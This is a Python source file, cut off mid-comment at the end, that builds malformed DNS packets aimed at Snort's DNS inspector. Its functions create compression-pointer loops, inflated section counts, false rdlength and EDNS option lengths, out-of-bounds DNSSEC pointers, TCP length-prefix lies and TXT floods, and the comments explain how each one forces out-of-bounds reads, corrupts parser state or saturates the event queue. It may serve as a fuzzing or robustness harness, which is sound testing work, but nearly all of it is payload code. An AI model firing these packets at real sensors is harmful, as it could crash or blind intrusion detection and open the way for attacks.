import struct
import random


def _encode_name(name: str) -> bytes:
    if not name:
        return b'\x00'
    encoded = b''
    for label in name.split('.'):
        label_bytes = label.encode('latin-1', errors='replace')
        encoded += bytes([len(label_bytes)]) + label_bytes
    return encoded + b'\x00'


class DNSHeader:
    def __init__(self, transaction_id=None, qr=0, opcode=0, aa=0, tc=0, rd=1,
                 ra=0, z=0, rcode=0, qdcount=0, ancount=0, nscount=0, arcount=0):
        self.transaction_id = transaction_id if transaction_id is not None else random.randint(0, 0xFFFF)
        self.qr = qr
        self.opcode = opcode
        self.aa = aa
        self.tc = tc
        self.rd = rd
        self.ra = ra
        self.z = z
        self.rcode = rcode
        self.qdcount = qdcount
        self.ancount = ancount
        self.nscount = nscount
        self.arcount = arcount

    def to_bytes(self) -> bytes:
        flags = (
            (self.qr & 0x1) << 15 |
            (self.opcode & 0xF) << 11 |
            (self.aa & 0x1) << 10 |
            (self.tc & 0x1) << 9 |
            (self.rd & 0x1) << 8 |
            (self.ra & 0x1) << 7 |
            (self.z & 0x7) << 4 |
            (self.rcode & 0xF)
        )
        return struct.pack("!HHHHHH",
                           self.transaction_id, flags,
                           self.qdcount, self.ancount,
                           self.nscount, self.arcount)


class DNSQuestion:
    def __init__(self, qname: str = "example.com", qtype: int = 1, qclass: int = 1):
        self.qname = qname
        self.qtype = qtype
        self.qclass = qclass

    def to_bytes(self) -> bytes:
        if isinstance(self.qname, str):
            name_bytes = _encode_name(self.qname)
        else:
            name_bytes = self.qname
        return name_bytes + struct.pack("!HH", self.qtype, self.qclass)


class DNSAnswer:
    def __init__(self, name: str = "example.com", rtype: int = 1, rclass: int = 1,
                 ttl: int = 300, rdata: bytes = b'\x7f\x00\x00\x01', rdlength: int = None):
        self.name = name
        self.rtype = rtype
        self.rclass = rclass
        self.ttl = ttl
        self.rdata = rdata
        self.rdlength = rdlength if rdlength is not None else len(rdata)

    def to_bytes(self) -> bytes:
        if isinstance(self.name, str):
            name_bytes = _encode_name(self.name)
        else:
            name_bytes = self.name
        return (name_bytes +
                struct.pack("!HHIH", self.rtype, self.rclass, self.ttl, self.rdlength) +
                self.rdata)


class DNSMessage:
    def __init__(self, header: DNSHeader = None, questions=None, answers=None):
        self.header = header or DNSHeader()
        self.questions = questions or []
        self.answers = answers or []

    def to_bytes(self) -> bytes:
        self.header.qdcount = len(self.questions)
        self.header.ancount = len(self.answers)
        body = b''
        for q in self.questions:
            body += q.to_bytes()
        for a in self.answers:
            body += a.to_bytes()
        return self.header.to_bytes() + body


def build_compression_loop_packet(loop_type: str = "deep_chain") -> bytes:
    tid = random.randint(0, 0xFFFF)
    header = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0)

    if loop_type == "deep_chain":
        # 64-hop pointer chain before looping — forces Snort to follow 64 jumps
        # per name. Label 'a' at offset 12 (2 bytes); pointer chain at offset 14.
        body = b'\x01a'
        chain_depth = 64
        for i in range(chain_depth - 1):
            body += struct.pack("!H", 0xC000 | (14 + (i + 1) * 2))
        body += struct.pack("!H", 0xC000 | 14)  # final hop loops back to first pointer
        qtype_class = struct.pack("!HH", 1, 1)
        return header + body + qtype_class
    elif loop_type == "wide_fan":
        # 8 questions all pointing into the same 32-hop loop: forces 8 independent
        # chain traversals per packet. chain_base = 12 + 8*6 = 60.
        n_questions = 8
        chain_depth = 32
        chain_base = 12 + n_questions * 6
        header = struct.pack("!HHHHHH", tid, 0x0100, n_questions, 0, 0, 0)
        body = b''
        for _ in range(n_questions):
            body += struct.pack("!H", 0xC000 | chain_base)
            body += struct.pack("!HH", 1, 1)
        for i in range(chain_depth - 1):
            body += struct.pack("!H", 0xC000 | (chain_base + (i + 1) * 2))
        body += struct.pack("!H", 0xC000 | chain_base)  # loop
        return header + body
    elif loop_type == "qdcount_bomb":
        # Header claims 65535 questions; only 1 real entry followed by a 32-hop
        # loop chain. Snort attempts to parse 65535 questions, overrunning the
        # packet boundary after exhausting the ~82 bytes of actual data.
        header = struct.pack("!HHHHHH", tid, 0x0100, 0xFFFF, 0, 0, 0)
        chain_base = 18
        body = struct.pack("!H", 0xC000 | chain_base)  # name ptr at offset 12
        body += struct.pack("!HH", 1, 1)               # qtype, qclass
        chain_depth = 32
        for i in range(chain_depth - 1):
            body += struct.pack("!H", 0xC000 | (chain_base + (i + 1) * 2))
        body += struct.pack("!H", 0xC000 | chain_base)  # loop
        return header + body
    else:
        # default: deep_chain
        body = b'\x01a'
        chain_depth = 64
        for i in range(chain_depth - 1):
            body += struct.pack("!H", 0xC000 | (14 + (i + 1) * 2))
        body += struct.pack("!H", 0xC000 | 14)
        return header + body + struct.pack("!HH", 1, 1)


def build_label_flood_packet(strategy: str = "max_len_labels") -> bytes:
    tid = random.randint(0, 0xFFFF)
    header = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0)

    if strategy == "max_labels":
        labels = [b'\x01' + bytes([random.randint(ord('a'), ord('z'))]) for _ in range(127)]
    elif strategy == "max_len_labels":
        # 63-byte labels (RFC maximum per label) × 10: ~25× more data per parse
        # compared to 1-byte labels, stressing Snort's per-label allocation path.
        labels = [b'\x3f' + bytes([random.randint(0x61, 0x7a)] * 63) for _ in range(10)]
    elif strategy == "recursive_compression":
        # 100 questions all sharing one 63-byte label via compression pointers.
        # Forces Snort to allocate/copy the same large label 100 times per packet.
        # big_label_offset = 12 + 100*6 = 612
        n_questions = 100
        big_label_offset = 12 + n_questions * 6
        hdr = struct.pack("!HHHHHH", tid, 0x0100, n_questions, 0, 0, 0)
        body = b''
        for _ in range(n_questions):
            body += struct.pack("!H", 0xC000 | big_label_offset)
            body += struct.pack("!HH", 1, 1)
        body += b'\x3f' + bytes([random.randint(0x61, 0x7a)] * 63) + b'\x00'
        return hdr + body
    else:
        labels = [b'\x01' + bytes([random.randint(ord('a'), ord('z'))]) for _ in range(127)]

    name = b''.join(labels) + b'\x00'
    qtype_class = struct.pack("!HH", 1, 1)
    return header + name + qtype_class


def build_response_packet(anomaly: str = "rdlength_mismatch") -> bytes:
    tid = random.randint(0, 0xFFFF)
    flags = 0x8580
    question_name = _encode_name("example.com")
    question = question_name + struct.pack("!HH", 1, 1)

    if anomaly == "rdlength_mismatch":
        answer = b'\xc0\x0c' + struct.pack("!HHIH", 1, 1, 300, 100) + b'\x7f\x00\x00\x01'
        header = struct.pack("!HHHHHH", tid, flags, 1, 1, 0, 0)

    elif anomaly == "cname_bad_pointer":
        bad_ptr = b'\xc0\xff'
        answer = b'\xc0\x0c' + struct.pack("!HHIH", 5, 1, 300, len(bad_ptr)) + bad_ptr
        header = struct.pack("!HHHHHH", tid, flags, 1, 1, 0, 0)

    elif anomaly == "count_mismatch":
        answer = b'\xc0\x0c' + struct.pack("!HHIH", 1, 1, 300, 4) + b'\x7f\x00\x00\x01'
        header = struct.pack("!HHHHHH", tid, flags, 1, 10, 0, 0)

    elif anomaly == "obsolete_rr_flood":
        # 8 RRs with obsolete/experimental types (MD=3,MF=4,MB=7,MG=8,MR=9,NULL=10,MINFO=14,WKS=11).
        # Each hits ParseDNSRData's switch and fires DetectionEngine::queue_event() once.
        # 8 events per packet x high packet rate saturates the detection engine event queue.
        obs_types = [3, 4, 7, 8, 9, 10, 14, 11]
        body = question
        for t in obs_types:
            body += b'\xc0\x0c' + struct.pack("!HHIH", t, 1, 300, 4) + b'\x7f\x00\x00\x01'
        header = struct.pack("!HHHHHH", tid, flags, 1, len(obs_types), 0, 0)
        return header + body

    elif anomaly == "authority_additional_bomb":
        # ancount=1 (real), nscount=0xFFFF, arcount=0xFFFF.
        # ParseDNSResponseMessage falls through ANS→AUTH→ADD sections; each section
        # pre-pushes to its tab vector before looping. With 65535 claimed records in
        # auth and addl, Snort iterates 65535 times per section until bytes exhausted.
        answer = b'\xc0\x0c' + struct.pack("!HHIH", 1, 1, 300, 4) + b'\x7f\x00\x00\x01'
        header = struct.pack("!HHHHHH", tid, flags, 1, 1, 0xFFFF, 0xFFFF)
        return header + question + answer

    elif anomaly == "section_counter_confusion":
        # qdcount=2 but only 1 question's bytes present. Parser iterates 2 questions,
        # exhausts bytes mid-parse of the second question, sets needNextPacket=true.
        # Malformed answer bytes that follow are then misread as the resumed question
        # when a subsequent segment arrives, corrupting parser state.
        question2_partial = b'\x07partial'
        answer = b'\xc0\x0c' + struct.pack("!HHIH", 1, 1, 300, 4) + b'\x7f\x00\x00\x01'
        header = struct.pack("!HHHHHH", tid, flags, 2, 1, 0, 0)
        return header + question + question2_partial + answer

    elif anomaly == "mx_bad_pointer":
        bad_exchange = struct.pack("!H", 10) + b'\xc0\xfe'
        answer = b'\xc0\x0c' + struct.pack("!HHIH", 15, 1, 300, len(bad_exchange)) + bad_exchange
        header = struct.pack("!HHHHHH", tid, flags, 1, 1, 0, 0)

    elif anomaly == "txt_overflow":
        txt_data = b'\xff' + b'A' * 255
        answer = b'\xc0\x0c' + struct.pack("!HHIH", 16, 1, 300, 0xFFFF) + txt_data
        header = struct.pack("!HHHHHH", tid, flags, 1, 1, 0, 0)

    elif anomaly == "nested_cname_chain":
        # 20-level CNAME chain where each record's RDATA names the next label.
        # The final CNAME RDATA is a compression pointer to offset 0x3FFF (OOB),
        # forcing Snort's CNAME resolver to read past the packet boundary.
        n_cnames = 20
        cname_question = _encode_name("a0.example.com") + struct.pack("!HH", 5, 1)
        body = cname_question
        for i in range(n_cnames - 1):
            rdata = _encode_name(f"a{i + 1}.example.com")
            body += b'\xc0\x0c' + struct.pack("!HHIH", 5, 1, 300, len(rdata)) + rdata
        bad_rdata = b'\xff\xff'  # compression ptr to offset 16383 — guaranteed OOB
        body += b'\xc0\x0c' + struct.pack("!HHIH", 5, 1, 300, len(bad_rdata)) + bad_rdata
        return struct.pack("!HHHHHH", tid, flags, 1, n_cnames, 0, 0) + body

    elif anomaly == "answer_bomb":
        # ancount=0xFFFF but only 2 answer records present. Snort iterates 65535
        # answer records, overrunning the packet boundary after the 2nd record.
        # answer2 also carries rdlength=0xFFFF with only 16 bytes of actual rdata.
        answer1 = b'\xc0\x0c' + struct.pack("!HHIH", 1, 1, 300, 4) + b'\x7f\x00\x00\x01'
        answer2 = b'\xc0\x0c' + struct.pack("!HHIH", 28, 1, 300, 0xFFFF) + b'\xfe\x80' + b'\x00' * 14
        header = struct.pack("!HHHHHH", tid, flags, 1, 0xFFFF, 0, 0)
        return header + question + answer1 + answer2

    elif anomaly == "soa_name_bomb":
        # SOA RDATA calls ParseDNSName TWICE per record (mname + rname).
        # 200 SOA records = 400 ParseDNSName calls per UDP packet.
        # Each rname/mname is a compression ptr to 0x0c (question), so the
        # pointer is legal (backward), maximising time in ParseDNSName.
        soa_rdata = b'\xc0\x0c' + b'\xc0\x0c' + struct.pack("!IIIII", 1, 3600, 900, 604800, 300)
        body = question
        for _ in range(200):
            body += b'\xc0\x0c' + struct.pack("!HHIH", 6, 1, 300, len(soa_rdata)) + soa_rdata
        header = struct.pack("!HHHHHH", tid, flags, 1, 200, 0, 0)
        return header + body

    elif anomaly == "ns_name_bomb":
        # NS RDATA calls ParseDNSName once per record.
        # 500 NS records = 500 ParseDNSName calls per packet.
        # Mix of ptr-to-0x0c and inline encoded names to vary pointer-follow depth.
        body = question
        for i in range(500):
            if i % 3 == 0:
                ns_rdata = b'\xc0\x0c'  # compression ptr — 1 ParseDNSName follow
            else:
                ns_rdata = _encode_name(f"ns{i}.example.com")  # inline — deep label walk
            body += b'\xc0\x0c' + struct.pack("!HHIH", 2, 1, 300, len(ns_rdata)) + ns_rdata
        header = struct.pack("!HHHHHH", tid, flags, 1, 500, 0, 0)
        return (header + body)[:8191]  # clamp to MAX_UDP_PAYLOAD

    else:
        answer = b'\xc0\x0c' + struct.pack("!HHIH", 1, 1, 300, 4) + b'\x7f\x00\x00\x01'
        header = struct.pack("!HHHHHH", tid, flags, 1, 1, 0, 0)

    return header + question + answer


def build_tcp_dns_two_message(anomaly: str = "second_oob_ptr") -> bytes:
    """Packs two TCP-DNS messages into one stream.
    The second message is crafted to stress Snort's per-message state reset.
    Returns a TCP-DNS stream payload (2-byte-length-prefixed pairs)."""
    tid1 = random.randint(0, 0xFFFF)
    flags = 0x8580
    question_name = _encode_name("example.com")
    question = question_name + struct.pack("!HH", 1, 1)
    answer = b'\xc0\x0c' + struct.pack("!HHIH", 1, 1, 300, 4) + b'\x7f\x00\x00\x01'
    dns_msg1 = struct.pack("!HHHHHH", tid1, flags, 1, 1, 0, 0) + question + answer

    tid2 = random.randint(0, 0xFFFF)

    if anomaly == "second_oob_ptr":
        # msg2 is exactly 18 bytes. The question-name field is \xc0\x12 — a
        # compression pointer to offset 0x12=18, which equals len(msg2).
        # ParseDNSName follows the pointer to dns_msg2_buf[18] — one byte past
        # the end of the 18-byte message buffer. OOB read candidate.
        hdr2 = struct.pack("!HHHHHH", tid2, 0x0100, 1, 0, 0, 0)  # 12 bytes
        dns_msg2 = hdr2 + b'\xc0\x12' + struct.pack("!HH", 1, 1)  # 18 bytes total

    elif anomaly == "second_malformed":
        # msg2 claims 0xFFFF answers but contains only a header and partial question.
        hdr2 = struct.pack("!HHHHHH", tid2, flags, 1, 0xFFFF, 0xFFFF, 0xFFFF)
        dns_msg2 = hdr2 + question  # no actual records

    elif anomaly == "second_truncated":
        # msg2 length prefix claims 512 bytes; only 14 bytes follow then FIN.
        # State machine sets needNextPacket, session closes — tests teardown path.
        hdr2 = struct.pack("!HHHHHH", tid2, flags, 1, 1, 0, 0)
        dns_msg2 = hdr2 + b'\xc0\x0c'  # only 14 bytes, but length-prefix will claim 512
        stream = (struct.pack("!H", len(dns_msg1)) + dns_msg1 +
                  struct.pack("!H", 512) + dns_msg2)  # lie about msg2 size
        return stream

    else:
        hdr2 = struct.pack("!HHHHHH", tid2, 0x0100, 1, 0, 0, 0)
        dns_msg2 = hdr2 + b'\xc0\x12' + struct.pack("!HH", 1, 1)

    stream = (struct.pack("!H", len(dns_msg1)) + dns_msg1 +
              struct.pack("!H", len(dns_msg2)) + dns_msg2)
    return stream


def build_edns_exploit_packet(anomaly: str = "option_overflow") -> bytes:
    tid = random.randint(0, 0xFFFF)
    question_name = _encode_name("example.com")
    question = question_name + struct.pack("!HH", 1, 1)

    if anomaly == "option_overflow":
        # OPT RDATA: NSID option (code=3) claims 65535 bytes; only 4 present.
        # Snort's EDNS option iterator reads option-length and advances by it,
        # walking far past the actual packet boundary.
        opt_rdata = struct.pack("!HH", 3, 0xFFFF) + b'\xde\xad\xbe\xef'
        opt_record = b'\x00' + struct.pack("!HHIH", 41, 4096, 0, len(opt_rdata)) + opt_rdata
        header = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 1)
        return header + question + opt_record

    elif anomaly == "cookie_corrupt":
        # DNS Cookie (RFC 7873) option=10: client cookie 8 bytes, then server
        # cookie whose claimed length (33) far exceeds the 4 bytes present.
        client_cookie = bytes([random.randint(0, 255) for _ in range(8)])
        cookie_data = client_cookie + b'\xba\xdf\x00\x0d'
        opt_rdata = struct.pack("!HH", 10, 41) + cookie_data
        opt_record = b'\x00' + struct.pack("!HHIH", 41, 4096, 0, len(opt_rdata)) + opt_rdata
        header = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 1)
        return header + question + opt_record

    elif anomaly == "chain_options":
        # Two consecutive EDNS options where the second option's length field (0xFFFF)
        # overflows the remaining RDATA, causing an OOB read in Snort's option loop.
        opt1 = struct.pack("!HH", 1, 8) + b'\x01' * 8
        opt2 = struct.pack("!HH", 2, 0xFFFF) + b'\x02' * 4
        opt_rdata = opt1 + opt2
        opt_record = b'\x00' + struct.pack("!HHIH", 41, 4096, 0, len(opt_rdata)) + opt_rdata
        header = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 1)
        return header + question + opt_record

    elif anomaly == "multiple_opt":
        # RFC 6891 §6.1.1: at most one OPT record per message.
        # Sending 4 forces any parser that doesn't enforce this into unexpected state.
        opt_record = b'\x00' + struct.pack("!HHIH", 41, 4096, 0, 0)
        header = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 4)
        return header + question + opt_record * 4

    elif anomaly == "payload_size_lie":
        # OPT CLASS = 0xFFFF (65535-byte UDP payload) combined with qdcount=0xFFFF.
        # Snort may size internal reassembly buffers from the advertised payload size.
        opt_record = b'\x00' + struct.pack("!HHIH", 41, 0xFFFF, 0, 0)
        header = struct.pack("!HHHHHH", tid, 0x0100, 0xFFFF, 0, 0, 1)
        return header + question + opt_record

    else:
        opt_record = b'\x00' + struct.pack("!HHIH", 41, 4096, 0, 0)
        header = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 1)
        return header + question + opt_record


def build_dnssec_record_packet(anomaly: str = "rrsig_oob_name") -> bytes:
    tid = random.randint(0, 0xFFFF)
    flags = 0x8580
    question_name = _encode_name("example.com")
    question = question_name + struct.pack("!HH", 1, 1)

    if anomaly == "rrsig_oob_name":
        # RRSIG Signer's Name field is a compression pointer to offset 16383 (OOB).
        # Snort resolves the Signer's Name as a DNS name; an OOB pointer here
        # forces the decompressor to read far beyond the packet buffer.
        signer_name = b'\xff\xff'
        signature = bytes([random.randint(0, 255) for _ in range(64)])
        rrsig_rdata = (struct.pack("!H", 1) + struct.pack("!B", 5) +
                       struct.pack("!B", 2) + struct.pack("!I", 3600) +
                       struct.pack("!I", 0x9FFFFFFF) + struct.pack("!I", 0) +
                       struct.pack("!H", 12345) + signer_name + signature)
        answer = b'\xc0\x0c' + struct.pack("!HHIH", 46, 1, 300, len(rrsig_rdata)) + rrsig_rdata
        header = struct.pack("!HHHHHH", tid, flags, 1, 1, 0, 0)
        return header + question + answer

    elif anomaly == "nsec3_hash_overflow":
        # NSEC3 HashLen byte claims 255 bytes of hash; only 8 provided.
        # Snort advances its parse pointer by HashLen, landing far outside the packet.
        # Also sets Iterations=10000 to trigger algorithmic complexity in validators.
        salt = b'\xde\xad\xbe\xef'
        nsec3_rdata = (struct.pack("!BB", 1, 0) +
                       struct.pack("!H", 10000) +
                       struct.pack("!B", len(salt)) + salt +
                       struct.pack("!B", 0xFF) + b'\xab' * 8 +
                       b'\x00\x07\x62\x00\x00\x00\x00\x03\x80')
        answer = b'\xc0\x0c' + struct.pack("!HHIH", 50, 1, 300, len(nsec3_rdata)) + nsec3_rdata
        header = struct.pack("!HHHHHH", tid, flags, 1, 1, 0, 0)
        return header + question + answer

    elif anomaly == "dnskey_flag_exploit":
        # DNSKEY with algorithm=253 (private-use), 256 bytes of garbage key material,
        # and undefined flag bits set. Triggers edge cases in key validation code.
        dnskey_rdata = (struct.pack("!H", 0x01FF) +
                        struct.pack("!B", 3) +
                        struct.pack("!B", 253) +
                        b'\xff' * 256)
        answer = b'\xc0\x0c' + struct.pack("!HHIH", 48, 1, 300, len(dnskey_rdata)) + dnskey_rdata
        header = struct.pack("!HHHHHH", tid, flags, 1, 1, 0, 0)
        return header + question + answer

    elif anomaly == "nsec_bitmap_overflow":
        # NSEC type bitmap: Window=0, BitmapLength=0xFF but only 2 bytes of bitmap
        # present. Parser advances by BitmapLength, reading 253 bytes past the data.
        next_name = _encode_name("z.example.com")
        type_bitmap = struct.pack("!BB", 0, 0xFF) + b'\xff\xff'
        nsec_rdata = next_name + type_bitmap
        answer = b'\xc0\x0c' + struct.pack("!HHIH", 47, 1, 300, len(nsec_rdata)) + nsec_rdata
        header = struct.pack("!HHHHHH", tid, flags, 1, 1, 0, 0)
        return header + question + answer

    elif anomaly == "rrsig_multi_record":
        # 4 RRSIG records covering different type codes. The last two use OOB
        # compression pointers as Signer's Name, stressing Snort's per-RR loop.
        header = struct.pack("!HHHHHH", tid, flags, 1, 4, 0, 0)
        body = question
        for i, type_covered in enumerate([1, 28, 46, 48]):
            signer = (_encode_name("example.com") if i < 2 else b'\xff\xfe')
            sig = bytes([random.randint(0, 255) for _ in range(20)])
            rdata = (struct.pack("!H", type_covered) + struct.pack("!B", 5) +
                     struct.pack("!B", 2) + struct.pack("!I", 3600) +
                     struct.pack("!I", 0x9FFFFFFF) + struct.pack("!I", 0) +
                     struct.pack("!H", random.randint(0, 0xFFFF)) + signer + sig)
            body += b'\xc0\x0c' + struct.pack("!HHIH", 46, 1, 300, len(rdata)) + rdata
        return header + body

    elif anomaly == "ds_digest_overflow":
        # DS record: DigestType=2 (SHA-256), DigestLength not explicitly encoded
        # but implied by rdlength. Set rdlength=0xFFFF; actual digest is 4 bytes.
        ds_rdata = struct.pack("!HBB", 12345, 5, 2) + b'\xab\xcd\xef\x01'
        answer = b'\xc0\x0c' + struct.pack("!HHIH", 43, 1, 300, 0xFFFF) + ds_rdata
        header = struct.pack("!HHHHHH", tid, flags, 1, 1, 0, 0)
        return header + question + answer

    else:
        signer_name = b'\xff\xff'
        rrsig_rdata = (struct.pack("!H", 1) + struct.pack("!B", 5) +
                       struct.pack("!B", 2) + struct.pack("!I", 3600) +
                       struct.pack("!I", 0x9FFFFFFF) + struct.pack("!I", 0) +
                       struct.pack("!H", 12345) + signer_name + b'\xaa' * 32)
        answer = b'\xc0\x0c' + struct.pack("!HHIH", 46, 1, 300, len(rrsig_rdata)) + rrsig_rdata
        header = struct.pack("!HHHHHH", tid, flags, 1, 1, 0, 0)
        return header + question + answer


def build_inspector_stress_packet(anomaly: str = "truncated_rr_chain"):
    """DNS mutations inspired by inspector vulnerability patterns (lookup collision,
    unbounded length decode, len-driven reads, state contamination, init races).
    Returns (udp_payload, tcp_payload) — exactly one is non-None."""
    tid = random.randint(0, 0xFFFF)
    flags = 0x8580
    question_name = _encode_name("example.com")
    question = question_name + struct.pack("!HH", 1, 1)

    if anomaly == "truncated_rr_chain":
        # Claims 10 answer records but data ends mid-way through the 2nd.
        # Parser iterates ancount=10, reading past buffer end on record 3.
        # Mirrors back_orifice unbounded 4-byte length decode without bounds check.
        header = struct.pack("!HHHHHH", tid, flags, 1, 10, 5, 3)
        a1 = b'\xc0\x0c' + struct.pack("!HHIH", 1, 1, 300, 4) + b'\x7f\x00\x00\x01'
        a2_trunc = b'\xc0\x0c' + struct.pack("!HHIH", 1, 1, 300, 4) + b'\x7f\x00'
        return header + question + a1 + a2_trunc, None

    elif anomaly == "rdlength_cascade":
        # 5 A-records where rdlength=20 but actual RDATA is 4 bytes.
        # Parser advances by rdlength (20), lands inside the next record's
        # type/class fields, interpreting them as RDATA of the current record.
        # Each step compounds misalignment. Mirrors len-driven OOB reads.
        header = struct.pack("!HHHHHH", tid, flags, 1, 5, 0, 0)
        body = question
        for _ in range(5):
            body += b'\xc0\x0c' + struct.pack("!HHIH", 1, 1, 300, 20) + b'\x41' * 4
        return header + body, None

    elif anomaly == "name_hash_flood":
        # 200 CNAME records with names designed to produce hash collisions:
        # same label length and byte-sum in the hashed portion.
        # Forces O(n^2) in any hash-based name cache or flow tracking table.
        # Mirrors lookup1/lookup2 collision weakness in back_orifice.
        header = struct.pack("!HHHHHH", tid, flags, 1, 200, 0, 0)
        body = question
        for i in range(200):
            c1 = chr(65 + (i % 26))
            c2 = chr(65 + ((255 - i) % 26))
            name = _encode_name(f"{c1}{c2}aa.example.com")
            body += b'\xc0\x0c' + struct.pack("!HHIH", 5, 1, 300, len(name)) + name
        return (header + body)[:65535], None

    elif anomaly == "stateful_tid_storm":
        # TCP stream with 30 DNS messages sharing the same TID but contradictory
        # flags and section counts. If Snort merges per-flow state by TID,
        # conflicting structures corrupt internal tracking — mirrors holdrand
        # PRNG state contamination in back_orifice.
        fixed_tid = random.randint(0, 0xFFFF)
        stream = b''
        for _ in range(30):
            f = random.choice([0x0100, 0x8580, 0x8183, 0x8500, 0x0000, 0xFFFF])
            qd = random.choice([0, 1, 0xFFFF])
            an = random.choice([0, 0xFFFF, 1])
            ns = random.choice([0, 0xFFFF])
            ar = random.choice([0, 0xFFFF])
            msg = struct.pack("!HHHHHH", fixed_tid, f, qd, an, ns, ar)
            if qd == 1:
                msg += question
            stream += struct.pack("!H", len(msg)) + msg
        return None, stream

    elif anomaly == "partial_header_truncation":
        # DNS packet is only 8 bytes — 4 bytes shorter than the mandatory
        # 12-byte header. Parser must not read the missing nscount/arcount
        # fields unconditionally. Mirrors back_orifice 4-byte read without
        # buffer boundary check.
        return struct.pack("!HHHH", tid, 0x0100, 1, 0), None

    elif anomaly == "zero_key_rdata":
        # All-zero RDATA in multiple record types. In lookup-table-based
        # parsers, zero is both "uninitialised slot" and a valid index.
        # Forces Snort to process zero-valued fields that may collide with
        # sentinel/empty markers in internal tables.
        header = struct.pack("!HHHHHH", tid, flags, 1, 4, 0, 0)
        body = question
        for rtype in [1, 5, 16, 28]:
            body += b'\xc0\x0c' + struct.pack("!HHIH", rtype, 1, 0, 8) + b'\x00' * 8
        return header + body, None

    elif anomaly == "rapid_init_burst":
        # TCP stream: 50 minimal DNS queries sent as fast as possible.
        # Targets race conditions during per-flow inspector initialisation.
        # If setup isn't serialised, concurrent threads may read partially
        # initialised flow state. Mirrors back_orifice PrecalcPrefix race.
        stream = b''
        for i in range(50):
            qname = _encode_name(f"q{i}.example.com")
            msg = struct.pack("!HHHHHH", random.randint(0, 0xFFFF), 0x0100, 1, 0, 0, 0)
            msg += qname + struct.pack("!HH", 1, 1)
            stream += struct.pack("!H", len(msg)) + msg
        return None, stream

    else:
        header = struct.pack("!HHHHHH", tid, flags, 1, 10, 0, 0)
        a1 = b'\xc0\x0c' + struct.pack("!HHIH", 1, 1, 300, 4) + b'\x7f\x00\x00\x01'
        return header + question + a1, None


def build_tcp_dns_segment(anomaly: str = "length_lie") -> bytes:
    """Returns a 2-byte-prefixed DNS payload for use with wrap_tcp_session (port 53 TCP)."""
    tid = random.randint(0, 0xFFFF)
    question_name = _encode_name("example.com")
    question = question_name + struct.pack("!HH", 1, 1)
    base_dns = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0) + question

    if anomaly == "length_lie":
        # 2-byte prefix claims 65535 bytes; actual payload is ~30 bytes.
        # Snort's TCP DNS reassembler waits for the remaining bytes, potentially
        # holding a large allocation open or accessing uninitialised buffer space.
        return struct.pack("!H", 0xFFFF) + base_dns

    elif anomaly == "length_zero":
        # Zero-length message over TCP. Snort must handle gracefully; an off-by-one
        # in "advance past this message" logic causes the next read to be misaligned.
        return struct.pack("!H", 0) + base_dns

    elif anomaly == "length_partial_header":
        # Prefix = 6: tells Snort the message is only 6 bytes (just the DNS header,
        # no question). But 30+ extra bytes follow. Parser reads 6 bytes as message,
        # then the next 2 bytes (start of question) become the next TCP-DNS length
        # prefix — turning valid question bytes into a wild length value.
        return struct.pack("!H", 6) + base_dns

    elif anomaly == "interleaved_messages":
        # Two DNS messages concatenated; length prefix covers both.
        # Snort reads the combined blob as one message, confusing the section parser.
        msg2 = struct.pack("!HHHHHH", random.randint(0, 0xFFFF), 0x0100, 0xFFFF, 0, 0, 0) + question
        combined = base_dns + msg2
        return struct.pack("!H", len(combined)) + combined

    elif anomaly == "negative_length_boundary":
        # Length prefix = 0x000C (12 bytes — exactly one DNS header, no questions).
        # Header claims qdcount=1 but no question bytes follow the 12-byte window.
        dns_header_only = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0)
        extra_garbage = struct.pack("!HHHHHH", 0xFFFF, 0xFFFF, 0xFFFF, 0xFFFF, 0xFFFF, 0xFFFF)
        return struct.pack("!H", 12) + dns_header_only + extra_garbage

    elif anomaly == "corrupt_mid_session":
        # Valid DNS query followed immediately (no length prefix gap) by a corrupt
        # blob. The TCP stream parser must detect the boundary correctly; if it
        # uses the first message's length to advance, the next "message" starts
        # inside the corrupt region.
        corrupt_blob = b'\xff' * 50
        return struct.pack("!H", len(base_dns)) + base_dns + corrupt_blob

    else:
        return struct.pack("!H", 0xFFFF) + base_dns


def build_txt_rdata_bomb(anomaly: str = "event_queue_flood") -> bytes:
    """TCP-DNS TXT record attacks targeting CheckRRTypeTXTVuln in dns.cc.
    Returns a 2-byte-prefixed TCP DNS payload for use with wrap_tcp_session."""
    tid = random.randint(0, 0xFFFF)
    flags = 0x8580
    question_name = _encode_name("example.com")
    question = question_name + struct.pack("!HH", 16, 1)

    if anomaly == "event_queue_flood":
        # txt_count*4 + total_txt_len*2 + 4 > 0xFFFF fires DNS_EVENT_RDATA_OVERFLOW.
        # Each \x01x: txt_count+=1, total_txt_len+=1 → overflow at n=10923 (6n-2 > 65535).
        # 11000 entries: 6*11000 - 2 = 65998 > 65535. Triggers CheckRRTypeTXTVuln overflow.
        n_entries = 11000
        rdata = b'\x01x' * n_entries
        answer = b'\xc0\x0c' + struct.pack("!HHIH", 16, 1, 300, len(rdata)) + rdata
        header = struct.pack("!HHHHHH", tid, flags, 1, 1, 0, 0)
        dns_msg = (header + question + answer)[:65535]
        return struct.pack("!H", len(dns_msg)) + dns_msg

    elif anomaly == "deep_txt_chain":
        # 255 entries of max-length TXT strings (\xff + 255 bytes).
        # overflow_check = 255*4 + 255*256*2 + 4 = 131588 > 0xFFFF.
        # Also tests Snort's handling of max txt_len (255) per string.
        # 255 entries × 256 bytes = 65280 bytes RDATA → dns_msg ≈ 65320 bytes < 65535
        n_entries = 255
        rdata = b''
        for _ in range(n_entries):
            rdata += b'\xff' + bytes([random.randint(0x20, 0x7e)] * 255)
        answer = b'\xc0\x0c' + struct.pack("!HHIH", 16, 1, 300, min(len(rdata), 0xFFFF)) + rdata
        header = struct.pack("!HHHHHH", tid, flags, 1, 1, 0, 0)
        dns_msg = header + question + answer
        dns_msg = dns_msg[:65535]
        return struct.pack("!H", len(dns_msg)) + dns_msg

    elif anomaly == "multi_answer_txt":
        # ancount=8, each a TXT record with 1400 entries: 6*1400-2 = 8398, still below
        # per-record threshold. But 8 records × 1400 entries = 11200 cumulative calls to
        # CheckRRTypeTXTVuln per packet, saturating the detection engine event queue.
        # Each record independently triggers when it has ≥10923 entries; use 1400 for
